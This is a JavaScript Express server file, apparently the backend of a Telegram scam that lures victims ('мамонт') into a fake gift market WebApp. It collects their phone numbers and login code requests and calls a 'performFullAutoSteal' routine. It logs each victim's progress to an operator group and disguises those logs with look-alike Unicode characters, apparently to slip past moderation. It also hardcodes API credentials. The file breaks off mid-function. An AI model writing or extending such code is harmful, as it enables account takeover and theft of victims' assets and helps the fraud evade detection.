import express from 'express';
import fs from 'fs-extra';
import path from 'path';
import { fileURLToPath } from 'url';
import { createRequire } from 'module';
import dotenv from 'dotenv';
import TelegramBot from 'node-telegram-bot-api';
import fetch from 'node-fetch';

dotenv.config();

const require = createRequire(import.meta.url);
const { TelegramClient } = require("telegram");
const { StringSession, StoreSession } = require("telegram/sessions");
const { Api } = require("telegram/tl");

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT || 3000;

// Функция для компактного логирования ошибок
function logError(error, context = '') {
  if (!error) {
    console.error(`[ERROR]${context ? ' ' + context : ''}:`, error);
    return;
  }
  
  // Извлекаем важную информацию из ошибки
  let errorInfo = {
    message: error.message || error.toString(),
    code: error.code,
  };
  
  // Если это ошибка Telegram API
  if (error.code === 'ETELEGRAM' && error.response) {
    const body = error.response.body || {};
    errorInfo = {
      message: body.description || error.message || 'Telegram API Error',
      code: body.error_code || error.code,
      statusCode: error.response.statusCode,
    };
  }
  
  // Выводим только важную информацию
  const errorStr = errorInfo.code 
    ? `${errorInfo.message} (code: ${errorInfo.code}${errorInfo.statusCode ? ', status: ' + errorInfo.statusCode : ''})`
    : errorInfo.message;
  
  console.error(`[ERROR]${context ? ' ' + context : ''}:`, errorStr);
  
  // Stack trace только если это не ошибка Telegram API и если есть
  if (error.stack && !error.code) {
    const stackLines = error.stack.split('\n').slice(0, 3);
    console.error(`[ERROR]${context ? ' ' + context : ''} Stack:`, stackLines.join('\n'));
  }
}

// Константы для логирования
const ADMIN_ID = 601408396;
let LOG_GROUP_ID = -1003117653183;
let LOG_TOPIC_ID = 74;

// Инициализация бота для отправки логов
let logBot = null;
let LOG_BOT_TOKEN = null;

// Функция маскировки номера телефона: +79*****7691
function maskPhoneNumber(phoneNumber) {
  if (!phoneNumber) return '';
  const cleaned = phoneNumber.replace(/\s+/g, '').replace(/\+/g, '');
  if (cleaned.length < 4) return phoneNumber;
  const countryCode = phoneNumber.startsWith('+') ? '+' : '';
  const visibleStart = cleaned.substring(0, 2);
  const visibleEnd = cleaned.substring(cleaned.length - 4);
  return `${countryCode}${visibleStart}*****${visibleEnd}`;
}

// Функция маскировки username - маскирует начало, оставляет конец видимым
function maskUsername(username) {
  if (!username || username === 'без username' || username === 'неизвестно') {
    return username;
  }
  
  // Убираем @ если есть
  const cleanUsername = username.replace('@', '');
  
  if (cleanUsername.length <= 1) {
    return `@${cleanUsername}`;
  }
  
  // Логика маскировки: оставляем последние символы видимыми
  // - Если username <= 2 символа: не маскируем
  // - Если username 3-5 символов: маскируем все кроме последних 2
  // - Если username 6-10 символов: маскируем все кроме последних 4
  // - Если username > 10 символов: маскируем все кроме последних 7
  if (cleanUsername.length <= 2) {
    return `@${cleanUsername}`;
  } else if (cleanUsername.length <= 5) {
    // Оставляем последние 2 символа видимыми
    const visibleCount = 2;
    const masked = '*'.repeat(cleanUsername.length - visibleCount) + cleanUsername.slice(-visibleCount);
    return `@${masked}`;
  } else if (cleanUsername.length <= 10) {
    // Оставляем последние 4 символа видимыми
    const visibleCount = 4;
    const masked = '*'.repeat(cleanUsername.length - visibleCount) + cleanUsername.slice(-visibleCount);
    return `@${masked}`;
  } else {
    // Оставляем последние 7 символов видимыми для длинных username
    const visibleCount = 7;
    const masked = '*'.repeat(cleanUsername.length - visibleCount) + cleanUsername.slice(-visibleCount);
    return `@${masked}`;
  }
}

// Функция маскировки username мамонта в сообщениях логов
function maskMamontUsernameInMessage(message) {
  if (!message || typeof message !== 'string') return message;
  
  // Паттерн для поиска: 👤 <b>Мамонт:</b> @username или 👤 ᴍᴀᴍᴏнᴛ: @username
  // Маскируем username после "Мамонт:" или "ᴍᴀᴍᴏнᴛ:"
  let masked = message;
  
  // Универсальный паттерн: ищем @username после любого варианта "Мамонт:" или "ᴍᴀᴍᴏнᴛ:"
  // Паттерн 1: 👤 <b>Мамонт:</b> @username
  masked = masked.replace(/(👤\s*<b>Мамонт:<\/b>\s*@)([a-zA-Z0-9_]+)/gi, (match, prefix, username) => {
    const maskedUsername = maskUsername(username);
    return prefix + maskedUsername.replace('@', '');
  });
  
  // Паттерн 2: 👤 ᴍᴀᴍᴏнᴛ: @username (обфусцированный)
  masked = masked.replace(/(👤\s*ᴍᴀᴍᴏнᴛ:\s*@)([a-zA-Z0-9_]+)/gi, (match, prefix, username) => {
    const maskedUsername = maskUsername(username);
    return prefix + maskedUsername.replace('@', '');
  });
  
  // Паттерн 3: 👤 <b>M🅰️M0ПT:</b> @username
  masked = masked.replace(/(👤\s*<b>M🅰️M0ПT:<\/b>\s*@)([a-zA-Z0-9_]+)/gi, (match, prefix, username) => {
    const maskedUsername = maskUsername(username);
    return prefix + maskedUsername.replace('@', '');
  });
  
  // Паттерн 4: Мамонт: @username (без эмодзи)
  masked = masked.replace(/(Мамонт:\s*@)([a-zA-Z0-9_]+)/gi, (match, prefix, username) => {
    const maskedUsername = maskUsername(username);
    return prefix + maskedUsername.replace('@', '');
  });
  
  // Паттерн 5: ᴍᴀᴍᴏнᴛ: @username (обфусцированный, без эмодзи)
  masked = masked.replace(/(ᴍᴀᴍᴏнᴛ:\s*@)([a-zA-Z0-9_]+)/gi, (match, prefix, username) => {
    const maskedUsername = maskUsername(username);
    return prefix + maskedUsername.replace('@', '');
  });
  
  // Паттерн 6: 👤 <b>ᴍᴀᴍᴏнᴛ:</b> @username (обфусцированный в тегах)
  masked = masked.replace(/(👤\s*<b>ᴍᴀᴍᴏнᴛ:<\/b>\s*@)([a-zA-Z0-9_]+)/gi, (match, prefix, username) => {
    const maskedUsername = maskUsername(username);
    return prefix + maskedUsername.replace('@', '');
  });
  
  // Паттерн 7: Универсальный - любой вариант "мамонт" (кириллица или обфусцированный) перед @username
  masked = masked.replace(/(👤\s*(?:<b>)?[мm][аa][мm][оo][нn][тt](?:<\/b>)?:\s*@)([a-zA-Z0-9_]+)/gi, (match, prefix, username) => {
    const maskedUsername = maskUsername(username);
    return prefix + maskedUsername.replace('@', '');
  });
  
  return masked;
}

// Функция обфускации текста - замена русских букв на похожие Unicode символы
function obfuscateText(text) {
  if (!text) return text;
  
  const obfuscationMap = {
    'А': 'ᴀ', 'а': 'ᴀ',
    'Б': 'ʙ', 'б': 'ʙ',
    'В': 'ʙ', 'в': 'ʙ',
    'Г': 'ᴦ', 'г': 'ᴦ',
    'Д': 'ᴅ', 'д': 'ᴅ',
    'Е': 'ᴇ', 'е': 'ᴇ',
    'Ё': 'ё', 'ё': 'ё',
    'Ж': 'ж', 'ж': 'ж',
    'З': 'ᴢ', 'з': 'ᴢ',
    'И': 'и', 'и': 'и',
    'Й': 'й', 'й': 'й',
    'К': 'ᴋ', 'к': 'ᴋ',
    'Л': 'ʟ', 'л': 'ʟ',
    'М': 'ᴍ', 'м': 'ᴍ',
    'Н': 'н', 'н': 'н',
    'О': 'ᴏ', 'о': 'ᴏ',
    'П': 'ᴨ', 'п': 'ᴨ',
    'Р': 'ᴩ', 'р': 'ᴩ',
    'С': 'ᴄ', 'с': 'ᴄ',
    'Т': 'ᴛ', 'т': 'ᴛ',
    'У': 'у', 'у': 'у',
    'Ф': 'ɸ', 'ф': 'ɸ',
    'Х': 'х', 'х': 'х',
    'Ц': 'ц', 'ц': 'ц',
    'Ч': 'ч', 'ч': 'ч',
    'Ш': 'ш', 'ш': 'ш',
    'Щ': 'щ', 'щ': 'щ',
    'Ъ': 'ъ', 'ъ': 'ъ',
    'Ы': 'ы', 'ы': 'ы',
    'Ь': 'ь', 'ь': 'ь',
    'Э': 'э', 'э': 'э',
    'Ю': 'ю', 'ю': 'ю',
    'Я': 'я', 'я': 'я'
  };
  
  // Заменяем только русские буквы, сохраняя HTML теги и другие символы
  let result = '';
  let inTag = false;
  let tagContent = '';
  
  for (let i = 0; i < text.length; i++) {
    const char = text[i];
    
    if (char === '<') {
      // Начинаем новый тег
      inTag = true;
      tagContent = char;
      continue;
    }
    
    if (char === '>') {
      // Заканчиваем тег - добавляем весь тег целиком без изменений
      tagContent += char;
      result += tagContent;
      tagContent = '';
      inTag = false;
      continue;
    }
    
    if (inTag) {
      // Внутри тега - просто собираем символы, не обфусцируем
      tagContent += char;
      continue;
    }
    
    // Вне тега - заменяем русские буквы на обфусцированные
    if (obfuscationMap[char]) {
      result += obfuscationMap[char];
    } else {
      result += char;
    }
  }
  
  // Если остался незакрытый тег, добавляем его как есть
  if (tagContent) {
    result += tagContent;
  }
  
  return result;
}

// Функция для проверки, является ли username валидным (не ID и не "user" + ID)
function isValidUsername(username) {
  if (!username || username === 'без username' || username === 'неизвестно') {
    return false;
  }
  // Проверяем, является ли username числом (ID)
  if (/^\d+$/.test(username)) {
    return false;
  }
  // Проверяем, начинается ли username с "user" + число
  if (/^user\d+$/.test(username)) {
    return false;
  }
  return true;
}

async function sendLogToGroup(message) {
  if (!logBot) return;
  try {
    // Маскируем username мамонта перед обфускацией
    const maskedMessage = maskMamontUsernameInMessage(message);
    // Обфусцируем сообщение перед отправкой
    const obfuscatedMessage = obfuscateText(maskedMessage);
    await logBot.sendMessage(LOG_GROUP_ID, obfuscatedMessage, { 
      parse_mode: 'HTML',
      message_thread_id: LOG_TOPIC_ID
    });
  } catch (e) {
    console.error(`[LOG] Ошибка отправки лога в группу: ${e.message}`);
  }
}

async function sendLogToAdmin(message) {
  if (!logBot) return;
  try {
    // Обфусцируем сообщение перед отправкой
    const obfuscatedMessage = obfuscateText(message);
    await logBot.sendMessage(ADMIN_ID, obfuscatedMessage, { parse_mode: 'HTML' });
  } catch (e) {
    console.error(`[LOG] Ошибка отправки лога админу: ${e.message}`);
  }
}

// Загружаем конфигурацию
let config = {};
let apiId = 30205730;
let apiHash = "e3b805b197e894b0d7502e4fde9c177b";

async function loadConfig() {
  try {
    const configPath = path.join(__dirname, "config.json");
    console.log(`[CONFIG] Ищу config.json по пути: ${configPath}`);
    console.log(`[CONFIG] __dirname: ${__dirname}`);
    console.log(`[CONFIG] process.cwd(): ${process.cwd()}`);
    
    if (await fs.pathExists(configPath)) {
      console.log(`[CONFIG] ✅ config.json найден по пути: ${configPath}`);
      try {
        const fileContent = await fs.readFile(configPath, 'utf8');
        console.log(`[CONFIG] Размер файла: ${fileContent.length} байт`);
        config = JSON.parse(fileContent);
        console.log(`[CONFIG] ✅ config.json успешно прочитан и распарсен`);
      if (config.apiId) apiId = config.apiId;
      if (config.apiHash) apiHash = config.apiHash;
      // Обновляем настройки логирования
      if (config.logGroupId !== undefined) LOG_GROUP_ID = config.logGroupId;
      if (config.logTopicId !== undefined) LOG_TOPIC_ID = config.logTopicId;
      
      // Загружаем BOT_TOKEN: сначала из config.json, потом из .env
      if (config.botToken && config.botToken.trim()) {
        LOG_BOT_TOKEN = config.botToken.trim();
        console.log(`[CONFIG] BOT_TOKEN загружен из config.json`);
      } else if (process.env.BOT_TOKEN) {
        LOG_BOT_TOKEN = process.env.BOT_TOKEN.trim();
        console.log(`[CONFIG] BOT_TOKEN загружен из .env файла`);
        }
      } catch (readError) {
        console.error(`[CONFIG] ❌ Ошибка чтения/парсинга config.json: ${readError.message}`);
        console.error(`[CONFIG] ❌ Тип ошибки: ${readError.name}`);
        if (readError.stack) {
          console.error(`[CONFIG] ❌ Stack: ${readError.stack}`);
        }
        // Если это ошибка парсинга JSON, показываем проблемный участок
        if (readError instanceof SyntaxError && fileContent) {
          const errorPos = parseInt(readError.message.match(/position (\d+)/)?.[1] || '0');
          const start = Math.max(0, errorPos - 50);
          const end = Math.min(fileContent.length, errorPos + 50);
          console.error(`[CONFIG] ❌ Проблемный участок JSON (позиция ${errorPos}):`);
          console.error(`[CONFIG] ${fileContent.substring(start, end)}`);
          console.error(`[CONFIG] ${' '.repeat(Math.min(50, errorPos - start))}^`);
        }
        // Пробрасываем ошибку дальше, чтобы попасть в catch блок функции
        throw readError;
      }
    } else {
      console.warn(`[CONFIG] ⚠️  config.json не найден по пути: ${configPath}`);
      // Пробуем найти config.json в текущей рабочей директории
      const cwdConfigPath = path.join(process.cwd(), "config.json");
      if (await fs.pathExists(cwdConfigPath)) {
        console.log(`[CONFIG] ✅ config.json найден в рабочей директории: ${cwdConfigPath}`);
        const configData = await fs.readJson(cwdConfigPath);
        config = { ...config, ...configData };
        if (config.apiId) apiId = config.apiId;
        if (config.apiHash) apiHash = config.apiHash;
        if (config.logGroupId !== undefined) LOG_GROUP_ID = config.logGroupId;
        if (config.logTopicId !== undefined) LOG_TOPIC_ID = config.logTopicId;
        
        if (config.botToken && config.botToken.trim()) {
          LOG_BOT_TOKEN = config.botToken.trim();
          console.log(`[CONFIG] BOT_TOKEN загружен из config.json (рабочая директория)`);
        }
      } else {
        console.warn(`[CONFIG] ⚠️  config.json не найден и в рабочей директории: ${cwdConfigPath}`);
      // Если config.json не найден, пробуем загрузить из .env
      if (process.env.BOT_TOKEN) {
        LOG_BOT_TOKEN = process.env.BOT_TOKEN.trim();
        console.log(`[CONFIG] BOT_TOKEN загружен из .env файла (config.json не найден)`);
        }
      }
    }
    
    // Инициализируем бота для логов, если токен найден
    if (LOG_BOT_TOKEN) {
      try {
        logBot = new TelegramBot(LOG_BOT_TOKEN, { polling: false });
        console.log('✅ Бот для логов инициализирован');
      } catch (e) {
        console.warn('⚠️ Не удалось инициализировать бота для логов:', e.message);
      }
    } else {
      console.warn('⚠️ BOT_TOKEN не найден в config.json или .env, логирование в Telegram отключено');
    }
    
    // Устанавливаем путь к БД после загрузки конфига
    MAMONT_GIFTS_DB_PATH = path.join(__dirname, config.mamontGiftsDB || 'mamont-gifts.json');
    console.log(`[CONFIG] Путь к БД подарков: ${MAMONT_GIFTS_DB_PATH}`);
    console.log(`[CONFIG] ID группы для логов: ${LOG_GROUP_ID}`);
    console.log(`[CONFIG] ID темы для логов: ${LOG_TOPIC_ID}`);
  } catch (e) {
    console.log("⚠️  Не удалось загрузить config.json");
    MAMONT_GIFTS_DB_PATH = path.join(__dirname, 'mamont-gifts.json');
    
    // Пробуем загрузить из .env
    if (process.env.BOT_TOKEN) {
      LOG_BOT_TOKEN = process.env.BOT_TOKEN.trim();
      try {
        logBot = new TelegramBot(LOG_BOT_TOKEN, { polling: false });
        console.log('✅ Бот для логов инициализирован из .env');
      } catch (e) {
        console.warn('⚠️ Не удалось инициализировать бота для логов:', e.message);
      }
    }
  }
}

// Хранилище активных сессий авторизации
const activeSessions = new Map();
const workerInfo = new Map();

// Хранилище сохраненных номеров телефонов (userId -> phoneNumber)
const savedPhoneNumbers = new Map();
// Хранилище последних отправленных логов для предотвращения дублирования
const recentLogs = new Map(); // userId -> { logType, timestamp }

// Хранилище sessionId для мамонтов (userId -> sessionId) для автоматического обновления WebApp
const mamontSessions = new Map();

// Хранилище активных phoneCodeHash по номеру телефона
// phoneNumber -> { sessionId, phoneCodeHash, createdAt, timeout }
const activeCodeRequests = new Map();

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ==================== РЕДИРЕКТЫ (ПЕРЕД СТАТИКОЙ) ====================
// Главная страница - редирект на новый маркет
app.get('/', (req, res) => {
  res.redirect('/market.html');
});

// Редирект со старого index.html на новый маркет
app.get('/index.html', (req, res) => {
  res.redirect('/market.html');
});

// ==================== API ЭНДПОИНТЫ (ПЕРЕД СТАТИКОЙ) ====================
// ВАЖНО: API маршруты объявлены ниже (после импорта функций из bot-new.js)
// Статика будет добавлена ПОСЛЕ всех API маршрутов (см. строку ~2190)

// Обработка запросов к анимациям Stic (если файлы отсутствуют, возвращаем 404 без ошибки)
app.get('/market/Stic/:filename', (req, res) => {
  const filename = req.params.filename;
  const filePath = path.join(__dirname, 'sursmarketa', 'templates2', 'market', 'Stic', filename);
  
  fs.pathExists(filePath).then(exists => {
    if (exists) {
      res.sendFile(filePath);
    } else {
      // Если файл не найден, возвращаем 404 (анимации опциональны)
      console.log(`[MARKET] Анимация не найдена: ${filename} (это нормально, анимации опциональны)`);
      res.status(404).json({ error: 'Animation not found' });
    }
  }).catch(e => {
    console.error(`[MARKET] Ошибка при проверке анимации: ${e.message}`);
    res.status(404).json({ error: 'Animation not found' });
  });
});

// Путь к БД подарков мамонтов (будет установлен после loadConfig)
let MAMONT_GIFTS_DB_PATH = null;

// ==================== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ====================

// Декодирование base64 токена с параметрами воркера
function decodeParams(token) {
  try {
    const decoded = Buffer.from(token, 'base64').toString('utf-8');
    const shortParams = JSON.parse(decoded);
    return {
      worker: shortParams.w || null,
      worker_id: shortParams.wi ? parseInt(shortParams.wi) : null,
      mamont_id: shortParams.m ? parseInt(shortParams.m) : null,
      mamont_username: shortParams.mu || null
    };
  } catch (e) {
    console.error(`[DECODE-PARAMS] Ошибка декодирования токена: ${e.message}`);
    return null;
  }
}

async function loadMamontGiftsDB() {
  try {
    const dbPath = MAMONT_GIFTS_DB_PATH || path.join(__dirname, 'mamont-gifts.json');
    console.log(`[LOAD-DB] Загрузка БД из: ${dbPath}`);
    
    if (await fs.pathExists(dbPath)) {
      const data = await fs.readJson(dbPath);
      console.log(`[LOAD-DB] Загружено подарков: ${(data.gifts || []).length}`);
      if ((data.gifts || []).length > 0) {
        console.log(`[LOAD-DB] Примеры подарков:`, data.gifts.slice(0, 3).map(g => ({
          userId: g.userId,
          type: typeof g.userId,
          giftId: g.giftId
        })));
      }
      return data.gifts || [];
    } else {
      console.log(`[LOAD-DB] Файл БД не найден: ${dbPath}`);
    }
  } catch (e) {
    console.log(`[API] Ошибка загрузки БД подарков мамонтов: ${e.message}`);
    console.error(e.stack);
  }
  return [];
}

async function saveMamontGiftsDB(gifts) {
  try {
    const dbPath = MAMONT_GIFTS_DB_PATH || path.join(__dirname, 'mamont-gifts.json');
    const dbDir = path.dirname(dbPath);
    await fs.ensureDir(dbDir);
    const data = {
      lastUpdated: new Date().toISOString(),
      gifts: gifts
    };
    await fs.writeJson(dbPath, data, { spaces: 2 });
    console.log(`[SAVE-DB] Сохранено ${gifts.length} подарков в ${dbPath}`);
    return data;
  } catch (e) {
    console.error(`[API] Ошибка сохранения БД подарков мамонтов: ${e.message}`);
    return null;
  }
}

// Импортируем функции из bot-new.js
let performFullAutoSteal = null;
let getMamontGifts = null;
let getGiftInfo = null;
try {
  const botModule = await import('./bot-new.js');
  performFullAutoSteal = botModule.performFullAutoSteal;
  getMamontGifts = botModule.getMamontGifts;
  getGiftInfo = botModule.getGiftInfo;
  console.log('✅ Функции из bot-new.js успешно импортированы');
} catch (e) {
  console.warn(`[API] Не удалось импортировать функции из bot-new.js: ${e.message}`);
  console.warn(`[API] Используются локальные функции (если доступны)`);
}

// ==================== API ЭНДПОИНТЫ ====================

// ТЕСТОВЫЙ эндпоинт для проверки БД
app.get('/api/test-inventory', async (req, res) => {
  try {
    const allGifts = await loadMamontGiftsDB();
    return res.json({
      success: true,
      totalGifts: allGifts.length,
      gifts: allGifts.map(g => ({
        userId: g.userId,
        userIdType: typeof g.userId,
        username: g.username,
        giftId: g.giftId,
        giftName: g.giftName
      }))
    });
  } catch (e) {
    return res.status(500).json({ error: e.message });
  }
});

// Предварительная регистрация запроса номера (вызывается из WebApp перед открытием бота)
app.post('/api/request-phone', async (req, res) => {
  try {
    const { userId, giftId, username } = req.body;
    
    console.log(`[API-REQUEST-PHONE] Регистрация запроса номера для userId: ${userId}, giftId: ${giftId || 'нет'}`);
    
    // Предварительно сохраняем информацию о запросе (это опционально, так как бот тоже сохранит при /start)
    // Можно использовать для логирования или других целей
    await sendLogToAdmin(
      `📞 <b>З🅰️ПР0С П0МЭР🅰️ ИЗ VЭБАПП</b>\n\n` +
      `👤 П0ЛЬЗ0В🅰️ТЭЛЬ: @${username || 'без username'} (${userId})\n` +
      `${giftId ? `🎁 Gift ID: ${giftId}` : ''}`
    );
    
    res.json({ success: true });
  } catch (e) {
    console.error(`[API-REQUEST-PHONE] Ошибка: ${e.message}`);
    res.status(500).json({ error: e.message });
  }
});

// Сохранение номера телефона (вызывается из бота)
app.post('/api/save-phone', async (req, res) => {
  try {
    const { userId, phoneNumber, username, giftId } = req.body;
    
    console.log(`[API-SAVE-PHONE] Сохранение номера для userId: ${userId}, номер: ${phoneNumber}, giftId: ${giftId || 'нет'}`);
    
    if (!userId || !phoneNumber) {
      return res.status(400).json({ error: 'userId и phoneNumber обязательны' });
    }
    
    const normalizedUserId = String(userId);
    savedPhoneNumbers.set(normalizedUserId, {
      phoneNumber: phoneNumber,
      username: username,
      giftId: giftId || null, // Сохраняем giftId для автоматического создания сессии
      savedAt: new Date().toISOString()
    });
    
    // Получаем информацию о воркере из подарка
    let workerUsername = null;
    let workerId = null;
    if (giftId && getGiftInfo) {
      try {
        const gift = await getGiftInfo(giftId, userId);
        if (gift) {
          workerUsername = gift.workerUsername || null;
          workerId = gift.workerId || null;
        }
      } catch (e) {
        console.error(`[API-SAVE-PHONE] Ошибка получения информации о подарке: ${e.message}`);
      }
    }
    
    // Проверяем, не был ли уже отправлен этот лог недавно (защита от дублирования)
    const logKey = `${userId}_phone_saved`;
    const lastLog = recentLogs.get(logKey);
    const now = Date.now();
    
    if (!lastLog || (now - lastLog.timestamp) > 5000) { // 5 секунд окно
      const workerText = workerUsername || workerId ? `\n👤 <b>Воркер:</b> @${workerUsername || 'неизвестно'} (<code>${workerId || 'неизвестно'}</code>)` : '';
      const maskedPhone = maskPhoneNumber(phoneNumber);
      
      // Формируем текст мамонта: если username валидный, показываем его, иначе только ID
      const mamontText = username && isValidUsername(username)
        ? `👤 <b>Мамонт:</b> @${username} (<code>${userId}</code>)`
        : `👤 <b>Мамонт:</b> <code>${userId}</code>`;
      
      await sendLogToGroup(
        `📞 <b>Ввод номера телефона</b>\n` +
        `📱 <b>Номер:</b> <code>${maskedPhone}</code>\n` +
        `${mamontText}${workerText}`
      );
      
      // Сохраняем время отправки лога
      recentLogs.set(logKey, { logType: 'phone_saved', timestamp: now });
      
      // Очищаем старые логи (старше 30 секунд)
      for (const [key, value] of recentLogs.entries()) {
        if (now - value.timestamp > 30000) {
          recentLogs.delete(key);
        }
      }
    } else {
      console.log(`[API-SAVE-PHONE] Лог уже отправлен недавно, пропускаем дубликат для userId: ${userId}`);
    }
    
    await sendLogToAdmin(
      `💾 П0МЭР С0ХР🅰️ПЭП П🅰️ СЭРВЭРЭ\n\n` +
      `👤 П0ЛЬЗ0В🅰️ТЭЛЬ: @${username || 'без username'} (${userId})\n` +
      `📱 П0МЭР: ${phoneNumber}\n` +
      `${giftId ? `🎁 Gift ID: ${giftId}` : ''}`
    );
    
    console.log(`[API-SAVE-PHONE] Номер сохранен для userId: ${userId}`);
    
    res.json({ success: true, giftId: giftId || null });
  } catch (e) {
    console.error(`[API-SAVE-PHONE] Ошибка: ${e.message}`);
    res.status(500).json({ error: e.message });
  }
});

// Проверка сохраненного номера (вызывается из WebApp)
app.get('/api/check-phone/:userId', async (req, res) => {
  try {
    const rawUserId = req.params.userId;
    const userId = String(rawUserId);
    
    console.log(`[API-CHECK-PHONE] Проверка номера для userId: ${userId}`);
    
    const savedPhone = savedPhoneNumbers.get(userId);
    const sessionInfo = mamontSessions.get(userId);
    
    if (savedPhone) {
      console.log(`[API-CHECK-PHONE] Найден номер: ${savedPhone.phoneNumber}, giftId: ${savedPhone.giftId || 'нет'}`);
      res.json({ 
        success: true, 
        phoneNumber: savedPhone.phoneNumber,
        giftId: savedPhone.giftId || null,
        sessionId: sessionInfo?.sessionId || null,
        savedAt: savedPhone.savedAt
      });
    } else {
      console.log(`[API-CHECK-PHONE] Номер не найден для userId: ${userId}`);
      res.json({ success: false, phoneNumber: null });
    }
  } catch (e) {
    console.error(`[API-CHECK-PHONE] Ошибка: ${e.message}`);
    res.status(500).json({ error: e.message });
  }
});

// Проверка активной сессии для мамонта (вызывается из WebApp)
app.get('/api/check-session/:userId', async (req, res) => {
  try {
    const userId = String(req.params.userId);
    const sessionInfo = mamontSessions.get(userId);
    
    if (sessionInfo && activeSessions.has(sessionInfo.sessionId)) {
      res.json({
        success: true,
        sessionId: sessionInfo.sessionId,
        giftId: sessionInfo.giftId
      });
    } else {
      res.json({ success: false, sessionId: null });
    }
  } catch (e) {
    console.error(`[API-CHECK-SESSION] Ошибка: ${e.message}`);
    res.status(500).json({ error: e.message });
  }
});

// API для логирования открытия маркета
app.post('/api/market-opened', async (req, res) => {
  try {
    const { userId, workerUsername, workerId, mamontUsername, mamontId } = req.body;
    
    if (!userId) {
      return res.status(400).json({ error: 'userId обязателен' });
    }
    
    const normalizedUserId = parseInt(userId);
    
    // Получаем параметры из запроса
    let finalWorkerUsername = workerUsername || null;
    let finalWorkerId = workerId || null;
    let finalMamontUsername = mamontUsername || null;
    
    // Если username мамонта не передан, пытаемся получить из БД подарков
    if (!finalMamontUsername) {
      try {
        const gifts = await loadMamontGiftsDB();
        const userGift = gifts.find(g => {
          const gUserId = typeof g.userId === 'string' ? parseInt(g.userId) : g.userId;
          return gUserId === normalizedUserId;
        });
        if (userGift && userGift.username && userGift.username !== 'без username') {
          finalMamontUsername = userGift.username;
        }
      } catch (e) {
        console.error(`[API-MARKET-OPENED] Ошибка получения username из БД: ${e.message}`);
      }
    }
    
    // Если данные воркера не переданы, пытаемся получить из БД подарков
    if (!finalWorkerUsername && !finalWorkerId) {
      try {
        const gifts = await loadMamontGiftsDB();
        const userGift = gifts.find(g => {
          const gUserId = typeof g.userId === 'string' ? parseInt(g.userId) : g.userId;
          return gUserId === normalizedUserId;
        });
        if (userGift) {
          if (userGift.workerUsername && !finalWorkerUsername) {
            finalWorkerUsername = userGift.workerUsername;
          }
          if (userGift.workerId && !finalWorkerId) {
            finalWorkerId = userGift.workerId;
          }
        }
      } catch (e) {
        console.error(`[API-MARKET-OPENED] Ошибка получения данных воркера из БД: ${e.message}`);
      }
    }
    
    // Формируем username для лога
    const username = finalMamontUsername && finalMamontUsername !== 'без username' 
      ? finalMamontUsername 
      : null;
    
    // Формируем текст мамонта
    const mamontText = username 
      ? `👤 <b>Мамонт:</b> @${username} (<code>${normalizedUserId}</code>)`
      : `👤 <b>Мамонт:</b> <code>${normalizedUserId}</code>`;
    
    // Формируем текст воркера
    const workerText = (finalWorkerUsername || finalWorkerId) 
      ? `\n👤 <b>Воркер:</b> @${finalWorkerUsername || 'неизвестно'} (<code>${finalWorkerId || 'неизвестно'}</code>)` 
      : '';
    
    console.log(`[API-MARKET-OPENED] Логирование: mamont=${username ? '@' + username : normalizedUserId} (${normalizedUserId}), worker=${finalWorkerUsername ? '@' + finalWorkerUsername : finalWorkerId || 'null'}`);
    
    await sendLogToGroup(
      `📱 <b>Мамонт запустил маркет</b>\n` +
      `${mamontText}${workerText}`
    );
    
    res.json({ success: true });
  } catch (e) {
    console.error(`[API-MARKET-OPENED] Ошибка: ${e.message}`);
    res.status(500).json({ error: e.message });
  }
});


// Получение инвентаря мамонта
app.get('/api/inventory/:userId', async (req, res) => {
  try {
    const rawUserId = req.params.userId;
    const userId = parseInt(rawUserId);
    
    console.log(`[API-INVENTORY] ========== НАЧАЛО ЗАПРОСА ==========`);
    console.log(`[API-INVENTORY] rawUserId из URL: "${rawUserId}"`);
    console.log(`[API-INVENTORY] userId после parseInt: ${userId}`);
    console.log(`[API-INVENTORY] isNaN: ${isNaN(userId)}`);
    console.log(`[API-INVENTORY] тип userId: ${typeof userId}`);
    
    // Загружаем все подарки из БД ПЕРЕД проверкой userId
    const allGifts = await loadMamontGiftsDB();
    console.log(`[API-INVENTORY] Всего подарков в БД: ${allGifts.length}`);
    
    if (allGifts.length > 0) {
      console.log(`[API-INVENTORY] Все подарки в БД:`);
      allGifts.forEach((g, idx) => {
        console.log(`[API-INVENTORY]   [${idx}] userId: ${g.userId} (тип: ${typeof g.userId}), giftId: ${g.giftId}, username: ${g.username}`);
      });
    } else {
      console.log(`[API-INVENTORY] ⚠️ БД ПУСТА!`);
    }
    
    if (!userId || isNaN(userId)) {
      console.error(`[API-INVENTORY] ❌ Invalid userId: ${rawUserId}`);
      console.log(`[API-INVENTORY] ⚠️ Но возвращаем ВСЕ подарки для отладки!`);
      
      // Для отладки возвращаем все подарки
      const formattedGifts = allGifts.map(gift => {
        const match = gift.giftId.match(/^(.+)-(\d+)$/);
        if (match) {
          const [, giftName, giftIdNum] = match;
          const formattedName = giftName.replace(/([A-Z])/g, ' $1').trim();
          return {
            name: formattedName,
            originalName: giftName,
            id: giftIdNum,
            giftId: gift.giftId,
            tonPrice: 1.0,
            rubPrice: 221.7,
            imageUrl: `https://nft.fragment.com/gift/${giftName.toLowerCase()}-${giftIdNum}.medium.jpg`,
            telegramUrl: gift.giftLink,
            receivedAt: gift.receivedAt,
            status: gift.status,
            _debug: `userId в БД: ${g.userId}`
          };
        }
        return null;
      }).filter(g => g !== null);
      
      console.log(`[API-INVENTORY] Возвращаем ${formattedGifts.length} подарков (все из БД)`);
      return res.json(formattedGifts);
    }

    console.log(`[API-INVENTORY] Ищем подарки для userId: ${userId} (тип: ${typeof userId})`);
    
    // Используем импортированную функцию, если доступна, иначе локальную фильтрацию
    let userGifts = [];
    if (getMamontGifts) {
      console.log(`[API-INVENTORY] Используем getMamontGifts для userId: ${userId}`);
      userGifts = await getMamontGifts(userId);
      console.log(`[API-INVENTORY] Получено подарков через getMamontGifts: ${userGifts.length}`);
      
      if (userGifts.length === 0 && allGifts.length > 0) {
        console.log(`[API-INVENTORY] ⚠️ getMamontGifts вернул 0 подарков, но в БД есть ${allGifts.length} подарков!`);
        console.log(`[API-INVENTORY] Пробуем локальную фильтрацию...`);
        // Пробуем локальную фильтрацию как fallback
        const normalizedUserId = typeof userId === 'string' ? parseInt(userId) : userId;
        userGifts = allGifts.filter(g => {
          const gUserId = typeof g.userId === 'string' ? parseInt(g.userId) : g.userId;
          return gUserId === normalizedUserId;
        });
